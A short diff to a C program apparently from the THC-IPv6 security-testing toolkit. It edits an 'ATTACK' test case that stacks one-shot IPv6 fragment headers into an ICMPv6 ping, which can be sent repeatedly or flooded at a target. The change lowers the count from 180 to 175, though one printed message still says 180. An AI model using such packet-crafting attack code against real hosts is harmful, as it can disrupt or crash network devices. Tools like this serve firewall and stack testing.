@@ -593,12 +593,12 @@ int main(int argc, char *argv[]) {
   curr = 0;
   if (only == ++count || only == 0)
     while (curr < resend || flood) {
-      printf("ATTACK Implementation %d - 180 one shot fragments\n", count);
+      printf("ATTACK Implementation %d - 175 one shot fragments\n", count);
       printf("  Sending 180 one-shot fragments ping\n");
       pkt3 = thc_destroy_packet(pkt3);
       if ((pkt3 = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len3, src6, dst6, 255, 0, count, 0, 0)) == NULL)
         return -1;
-      for (i = 0; i < 180; i++)
+      for (i = 0; i < 175; i++)
         if (thc_add_hdr_oneshotfragment(pkt3, &pkt_len3, 0xffff0000 + i + count + (curr << 7)) < 0)
           return -1;
       thc_add_icmp6(pkt3, &pkt_len3, ICMP6_PINGREQUEST, 0, 0xfacebabe + count + curr, (unsigned char *) &bla, 8, 0);
